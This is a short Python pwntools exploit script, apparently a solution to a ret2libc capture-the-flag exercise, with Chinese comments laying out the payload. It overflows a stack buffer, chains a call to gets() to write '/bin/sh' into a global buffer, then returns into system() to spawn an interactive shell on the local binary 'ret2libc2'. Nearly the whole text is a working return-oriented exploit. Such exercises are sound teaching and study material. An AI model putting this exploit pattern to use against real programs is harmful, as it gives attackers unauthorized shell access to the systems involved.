#!/usr/bin/python3
from pwn import *

gets_addr = 0x08048460
pop_ebx_ret_addr = 0x0804843d
buf2_addr = 0x0804a080
system_addr = 0x08048490

# 填充数据 offset=0x6c+4
# gets函数地址
# gadgets, 弹出buf2,保持堆栈平衡,并让eip保存system地址
# system函数地址, 4Bytes虚假的返回地址, buf2地址作为参数
payload = ((0x6c + 4) * b'A' + 
           p32(gets_addr) + 
           p32(pop_ebx_ret_addr) + p32(buf2_addr) +
           p32(system_addr) + 4 * b'B' + p32(buf2_addr)
           )

sh = process('./ret2libc2')
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()